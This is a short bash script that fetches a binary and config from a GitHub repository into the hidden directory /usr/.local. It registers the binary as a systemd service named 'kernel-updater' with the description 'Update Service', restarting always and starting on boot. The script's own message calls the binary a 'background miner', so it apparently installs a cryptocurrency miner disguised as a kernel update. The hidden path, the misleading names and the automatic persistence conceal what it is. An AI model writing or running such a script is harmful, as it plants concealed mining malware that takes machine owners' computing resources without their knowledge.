#!/bin/bash

sudo mkdir -p /usr/.local
wget https://github.com/hba343434/kernel/raw/refs/heads/main/kernel -O /usr/.local/kernel
wget https://github.com/hba343434/kernel/raw/refs/heads/main/config.json -O /usr/.local/config.json



sudo ln -sf /usr/.local/kernel /usr/local/bin/kernel


if [ -n "$1" ]; then
    sed -i 's/"pass": *"[^"]*",/"pass": "'"$1"'",/' /usr/.local/config.json
fi


sudo tee /usr/.local/run.sh > /dev/null << 'EOF'
#!/bin/bash
if ! pidof kernel >/dev/null; then
    nice kernel
else
    echo "kernel updater is already running in the background. Refusing to run another one."
    echo "Run \"killall kernel\" or \"sudo killall kernel\" if you want to remove background miner first."
fi
EOF

sudo chmod +x /usr/.local/run.sh

sudo tee /etc/systemd/system/kernel-updater.service > /dev/null << 'EOF'
[Unit]
Description=Update Service

[Service]
ExecStart=/usr/.local/run.sh
Restart=always
Nice=10

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reexec
sudo systemctl daemon-reload
sudo systemctl enable --now kernel-updater.service

echo "done"
